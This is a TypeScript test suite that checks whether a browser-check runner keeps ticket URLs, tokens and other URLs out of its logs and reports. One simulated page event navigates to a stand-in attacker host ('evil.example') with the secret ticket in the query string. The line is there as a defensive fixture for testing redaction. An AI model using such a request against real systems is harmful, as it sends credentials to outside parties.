import assert from "node:assert/strict";
import test from "node:test";

import { logLine } from "../src/log";
import { forLog } from "../src/redact";
import { runChecks } from "../src/runner";
import { API_ORIGIN, CONTENT_ORIGIN, fakeBrowser, fakeClock, fakeRaft, inProcessDispatch, leaseFor, recordingLogger, TICKET, TICKET_URL, WORKER_TOKEN } from "./fakes";

/**
 * Isolation condition 2: the lease's ticket URL is never logged. Logs carry ids, codes and counts
 * (src/log.ts); here a whole run (its checks dispatched in-process, in parallel), where the page,
 * the browser and Raft all put the ticket URL in
 * what they say, writes no line with the ticket, its URL, the token, or any URL at all; and the
 * report sent to Raft has no ticket either.
 */

const leaks = (text: string) => [TICKET, TICKET_URL, encodeURIComponent(TICKET), "ticket=tkt1", WORKER_TOKEN].filter((secret) => text.includes(secret));

test("a whole run, with the ticket URL everywhere, logs none of it", async () => {
  const clock = fakeClock();
  const { log, lines } = recordingLogger();
  // Check a: the page says the ticket URL in every way it can, navigates to it again and off the
  // origin with it, and its phone shot fails with it in the message. Check b: the load fails with
  // the URL in the browser's error, and Raft answers 409.
  const { browser } = fakeBrowser(
    (index) =>
      index === 0
        ? {
            duringOpen: (page) => {
              page.consoleError(`GET ${TICKET_URL} 401`, TICKET_URL, 1);
              page.pageError(`Error: could not read ${TICKET_URL}`);
              page.blocked(TICKET_URL);
              page.consoleError(`GET ${TICKET_URL} 401`, `https://cdn.example/app.js?ticket=${TICKET}`, 2);
              page.pageError(`Error: could not read ${TICKET_URL}`, `${CONTENT_ORIGIN}/app.js?ticket=${TICKET}`, 3);
              page.blocked(`${CONTENT_ORIGIN}/data.json?ticket=${TICKET}`);
              page.request({ url: `${CONTENT_ORIGIN}/_raft/open?ticket=${TICKET}`, isNavigation: true, isMainFrame: true, redirectedFrom: null });
              page.request({ url: `https://evil.example/?t=${TICKET}`, isNavigation: true, isMainFrame: true, redirectedFrom: null });
            },
            screenshot: (viewport) => (viewport.mobile ? new Error(`Protocol error (Page.captureScreenshot): Target closed at ${TICKET_URL}`) : new Uint8Array()),
          }
        : { open: { kind: "error", errorClass: `net::ERR_FAILED ${TICKET_URL}` } },
    { now: clock.now },
  );
  const raft = fakeRaft({ leases: [leaseFor({ checkId: "a" }), leaseFor({ checkId: "b" }), 204], results: [{ status: 200, body: { status: "done" } }, { status: 409 }] });
  const api = { origin: API_ORIGIN, token: WORKER_TOKEN, fetch: raft.fetch };
  await runChecks({ api, dispatch: inProcessDispatch({ api, acquireBrowser: async () => browser, now: clock.now, sleep: clock.sleep, log }), now: clock.now, sleep: clock.sleep, log });

  assert.ok(lines.length > 4, "the run did log");
  for (const line of lines) {
    assert.deepEqual(leaks(line), [], line);
    assert.equal(/[a-z]+:\/\//i.test(line), false, `no URL in a log line: ${line}`);
  }
  // The ids are there: what a log line is for.
  assert.ok(lines.some((line) => line.includes(leaseFor().artifactId) && line.includes(leaseFor().versionId) && line.includes('"checkId":"a"')));

  const reports = raft.calls.filter((call) => call.form !== null).map((call) => call.form!.get("report") as string);
  assert.equal(reports.length, 2);
  for (const report of reports) assert.deepEqual(leaks(report), [], report);
});

test("a run whose browser can't be had, with the URL in the launch error, logs no URL", async () => {
  const clock = fakeClock();
  const { log, lines } = recordingLogger();
  const raft = fakeRaft({ leases: [leaseFor()] });
  const api = { origin: API_ORIGIN, token: WORKER_TOKEN, fetch: raft.fetch };
  const dispatch = inProcessDispatch({
    api,
    acquireBrowser: async () => {
      throw new Error(`Unable to connect for ${TICKET_URL}`);
    },
    now: clock.now,
    sleep: clock.sleep,
    log,
  });
  await runChecks({ api, dispatch, now: clock.now, sleep: clock.sleep, log });
  assert.ok(lines.some((line) => JSON.parse(line).evt === "raft-check.browser.unavailable"));
  for (const line of lines) assert.deepEqual(leaks(line), [], line);
});

test("a log line takes no URL even in a field meant for a code", () => {
  const line = logLine(`event ${TICKET_URL}`, { checkId: "c", errorClass: `x ${TICKET_URL}`, problem: `see https://api.example.com/?ticket=${TICKET}` });
  assert.deepEqual(leaks(line), [], line);
  assert.equal(/[a-z]+:\/\//i.test(line), false, line);
  assert.equal(forLog("plain words stay"), "plain words stay");
  assert.equal(JSON.parse(logLine("check.leased", { checkId: "c", status: 200 })).evt, "raft-check.check.leased");
});
